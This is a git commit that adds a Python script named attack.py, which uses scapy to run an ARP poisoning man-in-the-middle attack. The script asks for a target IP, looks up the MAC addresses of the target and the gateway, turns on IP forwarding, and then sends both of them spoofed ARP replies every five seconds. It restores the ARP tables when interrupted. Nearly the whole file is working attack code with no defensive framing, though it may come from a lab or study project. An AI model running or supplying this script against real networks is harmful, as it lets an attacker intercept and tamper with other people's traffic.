86509bf30dce9a61ca5d27de7c123f709ab56918
Jacob Medeiros <32425713+JacobM08@users.noreply.github.com>
2024-10-09 21:41:01 -0400

    Add files via upload

---
+++ model/attack.py
@@ -0,0 +1,69 @@
+import time, scapy, threading
+from scapy.all import *
+from scapy.layers.l2 import ARP, Ether
+
+def main():
+    target_IP = input ("Input target IP address: ")
+    #router_IP = input("Enter Router IP address: ")
+    #inface = input("Enter Interface name to operate on: ")
+
+    target_mac = get_mac(target_IP)
+
+    print(target_mac)
+
+    gateway_ip = get_gateway()
+
+    gateway_mac = get_mac(gateway_ip)
+
+    print(gateway_mac)
+    arp_poison(target_IP, gateway_ip, target_mac, gateway_mac)
+
+
+
+def arp_poison(target_IP, gateway_ip, target_mac, gateway_mac):
+    packet_forward()
+    print("Starting ARP Poisoning")
+    try:
+        while 1:
+            send(ARP(op = 2, pdst=target_IP, psrc=gateway_ip, hwdst = target_mac))
+            send(ARP(op = 2, pdst=gateway_ip, psrc=target_IP, hwdst = gateway_mac))
+            time.sleep(5)
+    except KeyboardInterrupt:
+        restore_session(target_IP, gateway_ip, target_mac, gateway_mac)
+        print("Stopping")
+
+def get_mac(target_IP):
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP (pdst=target_IP), timeout=2, retry = 10)
+    for sent, rcv in ans:
+        return rcv.hwsrc
+
+def packet_forward():
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
+#Get gateway IP address
+def get_gateway():
+    gateway_ip = conf.route.route("0.0.0.0")[2]
+    return gateway_ip
+
+
+def restore_session(target_IP, gateway_ip, target_mac, gateway_mac):
+    send(ARP(op = 2, pdst=gateway_ip, psrc=target_IP, hwsrc = target_mac))
+    send(ARP(op = 2, pdst=target_IP, psrc=gateway_ip, hwsrc = gateway_mac))
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#main()
